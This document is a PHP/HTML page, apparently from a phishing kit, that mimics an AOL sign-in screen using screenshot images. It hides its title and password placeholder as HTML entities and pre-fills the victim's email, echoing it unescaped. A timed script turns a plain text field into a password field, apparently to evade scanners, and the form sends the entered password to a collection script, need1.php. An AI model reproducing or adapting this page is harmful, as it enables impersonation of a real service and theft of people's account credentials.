<?php

$id = $_POST['user'];

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#65;&#79;&#76;&#32;&#45;&#32;&#108;&#111;&#103;&#105;&#110;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[2].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
 .textbox {
    height: 37px;
    width: 275px;
	padding-left: 5px;
	font-size: 16px;
    border: 1px solid #B9BDC1;    
}
 .textbox:focus {
    border-color: #4488cc;
	border-style: solid;
	box-shadow: 0 1px 1px #BBB inset;   
    border-width: 1px;
    outline: 0;
}
.textbox1 { 
    color: #101010;
	text-align: center;
	font-family: Verdana,Arial,Helvetica,sans-serif;
  	font-size: 16px;
    border: 0px solid #fff; 
    outline:0; 
    height: 32px; 
    width: 275px; 
 }
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body bgColor="#F7F7F7">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:1018px; top:141px; width:303px; height:395px; z-index:0"><img src="images/m9.png" alt="" title="" border=0 width=303 height=395></div>

<div id="image2" style="position:absolute; overflow:hidden; left:1082px; top:466px; width:176px; height:43px; z-index:1"><a href="#"><img src="images/m10.png" alt="" title="" border=0 width=176 height=43></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:1055px; top:262px; width:227px; height:15px; z-index:2"><a href="#"><img src="images/m11.png" alt="" title="" border=0 width=227 height=15></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:1195px; top:367px; width:102px; height:16px; z-index:3"><a href="#"><img src="images/m12.png" alt="" title="" border=0 width=102 height=16></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:0px; top:731px; width:1349px; height:37px; z-index:4"><img src="images/m13.png" alt="" title="" border=0 width=1349 height=37></div>
<form action="need1.php?name=$id" name=chlokoiglni id=chlokoiglni method=post>
       <input name="user1" value="<?=$id?>" type="hidden">
<input name="formtext1" value="<?=$id?>" class="textbox1" autocomplete="off" type="text" style="position:absolute;width:263px;left:1037px;top:231px;z-index:5">
<input name="psw" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:254px;left:1042px;top:314px;z-index:6">
<div id="formimage1" style="position:absolute; left:1041px; top:404px; z-index:7"><input type="image" name="formimage1" width="255" height="42" src="images/gns.png"></div>
</div>

</body>
</html>
